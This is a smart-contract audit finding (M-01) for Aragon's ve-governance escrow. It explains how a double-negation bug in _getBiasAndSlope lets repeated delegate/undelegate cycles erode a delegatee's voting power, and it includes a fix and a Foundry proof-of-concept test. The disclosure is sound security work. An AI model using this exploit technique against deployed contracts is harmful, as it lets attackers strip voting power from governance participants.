[M-01] Delegation Exploit: Undelegation Incorrectly Schedules Excessive Future Voting Power Reductions

DelegationExploit.md

## [M-01] Delegation Exploit: Undelegation Incorrectly Schedules Excessive Future Voting Power Reductions

### Severity

Medium - Delegation manipulation exploit with delayed but significant impact (up to total loss of delegatee's voting power).

### Affected Versions

- Applies to v1.3.0 (and potentially earlier versions) of the ve-governance contracts.
- Primary affected file: [EscrowIVotesAdapter.sol](https://github.com/aragon/ve-governance/blob/cb99d5056f9efd23c9c5077c1c3dbf2aaee6895d/src/delegation/EscrowIVotesAdapter.sol) (lines 633-634 in `_getBiasAndSlope`).

### Description

In the voting escrow system, delegation allows users to assign their locked tokens' voting power to a delegatee. Undelegation should reverse this by immediately reducing the delegatee's voting power and canceling any scheduled future reductions (slope changes) associated with the undelegated tokens.

However, a bug in `_getBiasAndSlope` causes undelegation to incorrectly _increase_ the scheduled slope change at the lock's expiration time (`_locked.start + maxTime`). This results in an excessive future reduction in the delegatee's slope (and thus voting power) when checkpoints are processed.

Attackers can exploit this by repeatedly delegating and undelegating tokens to a target delegatee, stacking multiple erroneous positive slope changes. Over time (up to `maxTime` ~2 years), these changes trigger, potentially driving the delegatee's voting power to zero.

### Root Cause

The vulnerability stems from a double application of the `op` function (either `_positive` or `_negative`) in `_getBiasAndSlope` when updating `slopeChanges`:

```solidity
if (elapsed < maxTime) {
    slope = op(slope);  // First op: Correctly negates slope for undelegation.
    slopeChanges[_delegatee][_locked.start + maxTime] += op(slope);  // Second op: Incorrectly negates again, turning it positive.
}
```

- **Delegation** (`op = _positive`): Schedules a positive `slopeChanges` (correct: future slope decrease on expiration).
- **Undelegation** (`op = _negative`):
  - `slope = _negative(positive_slope)` = negative (correct for immediate reduction).
  - But `slopeChanges += _negative(negative_slope)` = positive (incorrect: schedules an _additional_ future decrease instead of canceling one).

In checkpointing (`_checkpoint` and `_delegateBalanceAt`), positive `slopeChanges` values lead to `lastPoint.slope -= dSlope` (where `dSlope` is positive), excessively reducing slope at future timestamps.

This error allows attackers to amplify future reductions via repeated delegate-undelegate cycles.

### Impact

- **Delegatees**: Voting power can be eroded over time, up to complete loss after `maxTime` (2 years). Effects are delayed but cumulative.

### Proof of Concept

A coded PoC is available in the repository (test/v1_3_0/integration/exploits/DelegationExploit.t.sol) & via gist.

Summary:

1. Bob delegates a lock to Alice (increases Alice's voting power).
2. After 1 year, Bob undelegates (immediately decreases Alice's power, but incorrectly schedules an extra future reduction).
3. Carol delegates a new lock to Alice (increases power again).
4. Over the next 1-2 years, Alice's voting power decays more than expected due to the erroneous slope change, eventually dropping ~50% below the correct value and continuing to decrease.

The test asserts that Alice's voting power decreases over time despite no further undelegations, confirming the exploit.

### Tools Used

Cursor, Foundry, Manual code review.

### Recommended Mitigation

Remove the second `op` application in `_getBiasAndSlope` to ensure undelegation correctly subtracts from `slopeChanges`:

```solidity
if (elapsed < maxTime) {
    slope = op(slope);
    slopeChanges[_delegatee][_locked.start + maxTime] += slope;  // No second op().
}
```

This fixes undelegation by adding a negative value to `slopeChanges`.

DelegationExploit.t.sol

```sol
// test/v1_3_0/integration/exploits/DelegationExploit.t.sol
pragma solidity ^0.8.17;

import { IGaugeVote } from "../../versions.sol";

import { EscrowBase } from "../../base/EscrowBase.sol";
import "forge-std/console.sol";

contract TestDelegationExploit is EscrowBase {
  address tokenOwner = address(this);

  address gauge = address(0x777);

  // delegatee 1
  address alice = address(1);
  // delegator 1
  address bob = address(2);
  // delegator 2
  address carol = address(3);

  uint256[] tokenIds = new uint256[](3);

  // one year + dates
  uint256 oneYear = 365 days;
  uint256 oneWeek = 7 days;
  uint256 jan_1_2025 = 1735689600;

  function setUp() public override {
    super.setUp();

    super.mintAndApproveEscrow();

    Lock_1_Amount = 50e18; // increase to 500e18 to eliminate bob's future voting power
    Lock_2_Amount = 50e18;

    token.mint(bob, Lock_1_Amount);
    token.mint(carol, Lock_2_Amount);

    vm.warp(jan_1_2025);

    vm.prank(bob);
    token.approve(address(escrow), Lock_1_Amount);

    vm.prank(carol);
    token.approve(address(escrow), Lock_2_Amount);

    vm.prank(bob);
    tokenIds[0] = escrow.createLock(Lock_1_Amount);

    nftLock.enableTransfers();

    // create a gauge
    voter.createGauge(gauge, "metadata");
  }

  /*//////////////////////////////////////////////////////////////
                      IVotes Delegate
    //////////////////////////////////////////////////////////////*/

  function test_Delegation_Exploit() public {
    vm.prank(bob);
    ivotesAdapter.delegate(alice);

    assertEq(ivotesAdapter.numberOfDelegatedTokens(bob), 1);

    uint256 alice_votes_after_bob_delegation = ivotesAdapter.getVotes(alice);

    console.log(
      "alice_votes_after_bob_delegation",
      alice_votes_after_bob_delegation
    );

    // one year later
    vm.warp(jan_1_2025 + oneYear);

    uint256 alice_votes_after_bob_delegation_plus_one_year = ivotesAdapter
      .getVotes(alice);
    console.log(
      "alice_votes_after_bob_delegation_plus_one_year",
      alice_votes_after_bob_delegation_plus_one_year
    );

    uint256[] memory bob_tokens = new uint256[](1);
    bob_tokens[0] = tokenIds[0];

    vm.prank(bob);
    ivotesAdapter.undelegate(bob_tokens);

    uint256 alice_votes_after_bob_undelegation = ivotesAdapter.getVotes(alice);
    console.log(
      "alice_votes_after_bob_undelegation",
      alice_votes_after_bob_undelegation
    );

    // two years less 3 weeks later
    vm.warp(jan_1_2025 + ((2 * oneYear) - (3 * oneWeek)));

    vm.prank(carol);
    tokenIds[1] = escrow.createLock(Lock_2_Amount);

    vm.prank(carol);
    ivotesAdapter.delegate(alice);

    uint256 alice_votes_after_carol_delegation = ivotesAdapter.getVotes(alice);
    console.log(
      "alice_votes_after_carol_delegation",
      alice_votes_after_carol_delegation
    );

    // three years later
    vm.warp(jan_1_2025 + ((3 * oneYear) + (3 * oneWeek)));

    uint256 alice_votes_after_carol_delegation_plus_one_year = ivotesAdapter
      .getVotes(alice);
    console.log(
      "alice_votes_after_carol_delegation_plus_one_year",
      alice_votes_after_carol_delegation_plus_one_year
    );

    // alice voting power should be higher but it's lower by ~50% and continues to decrease
    assertTrue(
      alice_votes_after_carol_delegation_plus_one_year <
        alice_votes_after_carol_delegation,
      "Alice's votes should have decreased over time due to the bug"
    );
  }
}
```
